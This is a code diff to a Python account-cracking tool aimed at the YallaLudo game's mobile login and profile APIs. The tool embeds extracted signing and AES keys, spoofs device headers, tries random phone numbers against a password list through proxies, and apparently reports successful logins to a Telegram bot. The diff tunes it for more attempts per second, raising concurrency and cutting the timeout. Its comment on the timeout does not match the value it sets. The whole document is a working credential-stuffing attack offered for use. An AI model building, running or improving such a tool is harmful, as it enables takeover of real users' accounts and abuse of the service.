@@ -53,7 +53,11 @@ HERA = "f580270da66e44438d5ed30fdb08ebba"
 SPRE = "2.0_2_"
 LOGIN_PATH = "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
 PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
-TIMEOUT = 15
+
+# ==================== تحسينات السرعة ====================
+TIMEOUT = 0.1 # من 15 إلى 5 ثواني
+CONCURRENCY = 500  # من 300 إلى 500
+MAX_TASKS = 1000  # من 2000 إلى 1000
 
 # ==================== متغيرات التليجرام ====================
 BOT_TOKEN = ""
@@ -305,7 +309,7 @@ def payload(mobile, password_md5, dev):
     }
     return json.dumps(data, separators=(',',':'), ensure_ascii=False).encode('utf-8')
 
-# ==================== دالة تسجيل الدخول ====================
+# ==================== دالة تسجيل الدخول (محسنة) ====================
 async def login_account(session, mobile, password_md5, dev=None, proxy=None):
     if dev is None:
         dev = {
@@ -326,6 +330,7 @@ async def login_account(session, mobile, password_md5, dev=None, proxy=None):
     body = payload(mobile, password_md5, dev)
     headers, wire, hera, dev = buildrequest(body, dev)
     
+    # تجربة جميع السيرفرات مع مهلة قصيرة
     for server in LOGIN_SERVERS:
         try:
             url = server + LOGIN_PATH
@@ -359,6 +364,8 @@ async def login_account(session, mobile, password_md5, dev=None, proxy=None):
                         return {"success": True, "data": user_data, "token": token, "user_id": user_id, "dev": dev, "profile": None}
                 elif result:
                     return {"success": False, "status": result.get("status"), "tips": result.get("tips", "")}
+        except asyncio.TimeoutError:
+            continue
         except:
             continue
     
@@ -368,60 +375,60 @@ async def fetch_profile(session, token, user_id, dev, proxy=None):
     if not token or not user_id:
         return None
     
-    now = int(time.time() * 1000)
-    hera = uuid.uuid4().hex
-    nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
-    bag_sign = hashlib.md5(("c889f8f7dc69b1d67e1d3e43cf48f430" + nc).encode()).hexdigest().upper()
-    
-    bag = {
-        "token": token,
-        "sign": bag_sign,
-        "timeSpan": str(now),
-        "version": "1.4.9.2",
-        "deviceId": dev["deviceId"],
-        "deviceName": dev["deviceName"],
-        "deviceType": dev["deviceType"],
-        "downloadChannelId": dev["downloadChannelId"],
-        "shuMengId": dev["shuMengId"],
-        "nonce": nc,
-        "plateType": dev["plateType"],
-        "LanguageId": dev["LanguageId"],
-        "phoneModel": dev["phoneModel"],
-        "X-Phone-Country": dev["X-Phone-Country"],
-        "X-Sim-Country": dev["X-Sim-Country"],
-        "AndroidId": dev["AndroidId"],
-        "appType": dev["appType"],
-    }
-    bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
-    
-    sg = PROFILE_PATH + token + "1.4.9.2" + bb
-    sig = hmac.new("c889f8f7dc69b1d67e1d3e43cf48f430".encode(), sg.encode(), hashlib.sha256).hexdigest()
-    xs = "2.0_2_" + sig
-    
-    p = hashlib.md5(sg.encode()).hexdigest()
-    mp = f"{p}-{len(sg)}-c889f8f7dc69b1d67e1d3e43cf48f430-L3)qk*@8".encode()
-    xm = base64.b64encode(_aes_cbc(b"4e82797b276c5cb729db62aaa229a057", b"0102030405060708", mp)).decode()
-    
-    pm = _xor_b64(json.dumps({"userId": int(user_id)}, separators=(",", ":")), "c889f8f7dc69b1d67e1d3e43cf48f430")
-    
-    headers = {
-        "User-Agent": "YallaLudo-1.4.9.2-(Build 1040922)-Android 30",
-        "UserId": str(user_id),
-        "X-App-Id": "ludo",
-        "X-Baggage": bb,
-        "X-Access-Token": token,
-        "X-Timestamp": str(now + random.randint(50, 300)),
-        "versionString": "1.4.9.2",
-        "X-Sign": xs,
-        "X-Hera": "f580270da66e44438d5ed30fdb08ebba",
-        "X-Time": str(now + random.randint(50, 300)),
-        "X-Medusa": xm,
-        "Content-Type": "application/json; charset=utf-8",
-        "Accept-Encoding": "gzip",
-    }
-    
+    # تجربة جميع السيرفرات مع مهلة قصيرة
     for server in LOGIN_SERVERS:
         try:
+            now = int(time.time() * 1000)
+            nc = f"{random.randint(-2**31, 2**31-1)}_{uuid.uuid4()}"
+            bag_sign = hashlib.md5(("c889f8f7dc69b1d67e1d3e43cf48f430" + nc).encode()).hexdigest().upper()
+            
+            bag = {
+                "token": token,
+                "sign": bag_sign,
+                "timeSpan": str(now),
+                "version": "1.4.9.2",
+                "deviceId": dev["deviceId"],
+                "deviceName": dev["deviceName"],
+                "deviceType": dev["deviceType"],
+                "downloadChannelId": dev["downloadChannelId"],
+                "shuMengId": dev["shuMengId"],
+                "nonce": nc,
+                "plateType": dev["plateType"],
+                "LanguageId": dev["LanguageId"],
+                "phoneModel": dev["phoneModel"],
+                "X-Phone-Country": dev["X-Phone-Country"],
+                "X-Sim-Country": dev["X-Sim-Country"],
+                "AndroidId": dev["AndroidId"],
+                "appType": dev["appType"],
+            }
+            bb = base64.b64encode(json.dumps(bag, separators=(",", ":"), ensure_ascii=False).encode()).decode()
+            
+            sg = PROFILE_PATH + token + "1.4.9.2" + bb
+            sig = hmac.new("c889f8f7dc69b1d67e1d3e43cf48f430".encode(), sg.encode(), hashlib.sha256).hexdigest()
+            xs = "2.0_2_" + sig
+            
+            p = hashlib.md5(sg.encode()).hexdigest()
+            mp = f"{p}-{len(sg)}-c889f8f7dc69b1d67e1d3e43cf48f430-L3)qk*@8".encode()
+            xm = base64.b64encode(_aes_cbc(b"4e82797b276c5cb729db62aaa229a057", b"0102030405060708", mp)).decode()
+            
+            pm = _xor_b64(json.dumps({"userId": int(user_id)}, separators=(",", ":")), "c889f8f7dc69b1d67e1d3e43cf48f430")
+            
+            headers = {
+                "User-Agent": "YallaLudo-1.4.9.2-(Build 1040922)-Android 30",
+                "UserId": str(user_id),
+                "X-App-Id": "ludo",
+                "X-Baggage": bb,
+                "X-Access-Token": token,
+                "X-Timestamp": str(now + random.randint(50, 300)),
+                "versionString": "1.4.9.2",
+                "X-Sign": xs,
+                "X-Hera": "f580270da66e44438d5ed30fdb08ebba",
+                "X-Time": str(now + random.randint(50, 300)),
+                "X-Medusa": xm,
+                "Content-Type": "application/json; charset=utf-8",
+                "Accept-Encoding": "gzip",
+            }
+            
             url = server + PROFILE_PATH
             async with session.post(url, json={"paramJsonString": pm}, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                 if r.status in (403, 500, 404):
@@ -434,6 +441,8 @@ async def fetch_profile(session, token, user_id, dev, proxy=None):
                         return data
                     else:
                         return data
+        except asyncio.TimeoutError:
+            continue
         except:
             continue
     return None
@@ -485,9 +494,9 @@ By @to_ls"""
                         sent = True
                         break
                     else:
-                        await asyncio.sleep(2)
+                        await asyncio.sleep(1)
             except:
-                await asyncio.sleep(2)
+                await asyncio.sleep(1)
         
         if not sent:
             if RICH_AVAILABLE:
@@ -971,6 +980,11 @@ async def check_random_async(session, mobile, semaphore, passwords_list, proxy=N
                             stats['total'] += 1
                         return
                         
+            except asyncio.TimeoutError:
+                with stats_lock:
+                    stats['error'] += 1
+                    stats['total'] += 1
+                continue
             except Exception as e:
                 with stats_lock:
                     stats['error'] += 1
@@ -1220,12 +1234,11 @@ async def main_async():
         
         print("\n[+] Starting random checker...\n")
         
-        concurrency = 300
-        semaphore = asyncio.Semaphore(concurrency)
+        semaphore = asyncio.Semaphore(CONCURRENCY)
         
         threading.Thread(target=dashboard_loop, daemon=True).start()
         
-        connector = aiohttp.TCPConnector(limit=concurrency*2, limit_per_host=concurrency, force_close=False)
+        connector = aiohttp.TCPConnector(limit=CONCURRENCY*2, limit_per_host=CONCURRENCY, force_close=False)
         
         async with aiohttp.ClientSession(connector=connector) as session:
             tasks = []
@@ -1235,9 +1248,9 @@ async def main_async():
                 task = asyncio.create_task(check_random_async(session, mobile, semaphore, passwords_list, proxy))
                 tasks.append(task)
                 
-                if len(tasks) > 2000:
-                    done, pending = await asyncio.wait(tasks[:500], return_when=asyncio.FIRST_COMPLETED)
-                    tasks = list(pending) + tasks[500:]
+                if len(tasks) > MAX_TASKS:
+                    done, pending = await asyncio.wait(tasks[:MAX_TASKS//2], return_when=asyncio.FIRST_COMPLETED)
+                    tasks = list(pending) + tasks[MAX_TASKS//2:]
             
             if tasks:
                 await asyncio.gather(*tasks, return_exceptions=True)
